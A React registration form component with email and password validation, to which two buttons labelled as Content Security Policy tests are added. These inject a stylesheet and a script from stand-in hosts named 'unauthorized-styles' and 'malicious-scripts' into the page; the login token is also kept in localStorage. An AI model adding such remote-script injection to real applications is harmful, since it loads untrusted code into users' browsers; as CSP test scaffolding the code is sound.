import { useState } from "react";
import axios from "axios";

const isValidEmail = (email) =>
  /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);

const isStrongPassword = (password) =>
  /^(?=.*[A-Za-z])(?=.*\d)[A-Za-z\d!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]{8,}$/.test(password);

export default function Register() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [error, setError] = useState("");
  const [success, setSuccess] = useState("");

  const register = async () => {
    setError("");
    setSuccess("");

    if (!email || !password) {
      setError("Email and password are required.");
      return;
    }

    if (!isValidEmail(email)) {
      setError("Invalid email format.");
      return;
    }

    if (!isStrongPassword(password)) {
      setError("Password must be at least 8 characters long and include letters and numbers.");
      return;
    }

    try {
      const response = await axios.post(
        "/api/auth/register",
        {
          email,
          password
        }
      );

      localStorage.setItem("token", response.data.token);
      setSuccess("Registered and logged in!");
    } catch (err) {
      setError(
        err.response?.data?.message ||
        "Error registering."
      );
    }
  };

  // CSP VIOLATION: Attempt to create a style element with external CSS
  const injectExternalStyle = () => {
    const link = document.createElement('link');
    link.rel = 'stylesheet';
    link.href = 'https://unauthorized-styles.example.com/malicious.css';
    document.head.appendChild(link);
    console.log('CSP Violation: Attempted to inject external stylesheet');
  };

  // CSP VIOLATION: Attempt to create script element with external source
  const injectExternalScript = () => {
    const script = document.createElement('script');
    script.src = 'https://malicious-scripts.example.com/inject.js';
    document.body.appendChild(script);
    console.log('CSP Violation: Attempted to inject external script');
  };

  return (
    <div>
      {error && (
        <div className="error-message">
          {error}
        </div>
      )}

      {success && (
        <div className="success-message">
          {success}
        </div>
      )}

      <input
        type="email"
        placeholder="Email"
        onChange={(event) => setEmail(event.target.value)}
      />

      <input
        type="password"
        placeholder="Password"
        onChange={(event) => setPassword(event.target.value)}
      />

      <button onClick={register}>
        Register
      </button>

      <div style={{ marginTop: '10px', display: 'flex', gap: '10px', flexWrap: 'wrap' }}>
        <button
          onClick={injectExternalStyle}
          style={{ background: '#ff6b6b' }}
        >
          Test CSP: Inject External Style
        </button>
        <button
          onClick={injectExternalScript}
          style={{ background: '#ff6b6b' }}
        >
          Test CSP: Inject External Script
        </button>
      </div>
    </div>
  );
}